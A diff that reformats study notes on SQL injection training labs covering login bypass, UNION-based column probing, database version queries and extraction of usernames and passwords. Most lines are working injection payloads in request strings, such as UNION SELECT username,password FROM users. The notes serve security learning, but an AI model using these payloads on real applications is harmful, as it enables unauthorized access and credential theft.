@@ -1,18 +1,18 @@
-============================================
-============================================
-Basic
-============================================
+# ============================================
+
+# Basic
+
 ============================================
 Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.
 
-GET /filter?category=Lifestyle'+OR+1=1--
-============================================
+# GET /filter?category=Lifestyle'+OR+1=1--
+
 Lab: SQL injection vulnerability allowing login bypass
 To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user.
 
-csrf=1S06FGqYhs0aFA9vXNwOK28WiNsUJwGf&username=administrator'--&password=admin
-============================================
+# Username: Administrator'--
+
 ============================================
 SQL injection UNION attacks
 
@@ -53,25 +53,25 @@ Having already determined the number of required columns, you can probe each col
 
 If the data type of a column is not compatible with string data, the injected query will cause a database error
 
-
 # Database Version
+
 The queries to determine the database version for some popular database types are as follows:
 
-Database type	Query
-Microsoft, MySQL	`SELECT @@version`
-Oracle	`SELECT * FROM v$version`
-PostgreSQL	`SELECT version()`
+Database type Query
+Microsoft, MySQL `SELECT @@version`
+Oracle `SELECT * FROM v$version`
+PostgreSQL `SELECT version()`
 For example, you could use a UNION attack with the following input:
 
-' UNION SELECT @@version--
-============================================
+# ' UNION SELECT @@version--
+
 ============================================
 Lab: SQL injection UNION attack, determining the number of columns returned by the query
 
 To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.
 
-GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL--
-============================================
+# GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL--
+
 Lab: SQL injection UNION attack, finding a column containing text
 
 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
@@ -79,14 +79,17 @@ This lab contains an SQL injection vulnerability in the product category filter.
 The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.
 
 # Number of Columns
-GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL-- 
+
+GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
 
 # Identify String Columns
-GET /filter?category=Gifts'+UNION+SELECT+NULL,'a',NULL-- 
+
+GET /filter?category=Gifts'+UNION+SELECT+NULL,'a',NULL--
 
 # Return Specific String
-GET /filter?category=Gifts'+UNION+SELECT+NULL,'SI0fBf',NULL--
-============================================
+
+# GET /filter?category=Gifts'+UNION+SELECT+NULL,'SI0fBf',NULL--
+
 Lab: SQL injection UNION attack, retrieving data from other tables
 
 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
@@ -96,11 +99,13 @@ The database contains a different table called users, with columns called userna
 To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
 
 # Number of Columns
-GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL-- 
+
+GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL--
 
 # Extract Usernames and Passwords From Users table
-GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--
-============================================
+
+# GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--
+
 Lab: SQL injection UNION attack, retrieving multiple values in a single column
 
 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
@@ -110,42 +115,47 @@ The database contains a different table called users, with columns called userna
 To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
 
 # Number of Columns
+
 GET /filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--
 
 # Extract Usernames and Passwords From Users table
-GET /filter?category=Gifts'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--
-============================================
+
+# GET /filter?category=Gifts'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--
+
 Lab: SQL injection attack, querying the database type and version on Oracle
 
 This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
 
 # Determine Number of Columns using dual table (special built in table for Oracle)
+
 `'+UNION+SELECT+NULL,NULL+FROM+dual--`
 
 # Query to get version info via banner
-`'+UNION+SELECT+BANNER,NULL+FROM+v$version--`
-============================================
+
+# `'+UNION+SELECT+BANNER,NULL+FROM+v$version--`
+
 Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 
 This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
 
-# Determine Number of Columns 
+# Determine Number of Columns
+
 `'+UNION+SELECT+NULL,NULL#`
 
 # Query to get version info via banner
-`'+UNION+SELECT+@@version,+NULL#`
-============================================
-============================================
-============================================
-============================================
-============================================
-============================================
-============================================
-============================================
-============================================
-============================================
-============================================
-============================================
-============================================
-============================================
 
+# `'+UNION+SELECT+@@version,+NULL#`
+
+# ============================================
+
+# ============================================
+
+# ============================================
+
+# ============================================
+
+# ============================================
+
+# ============================================
+
+============================================
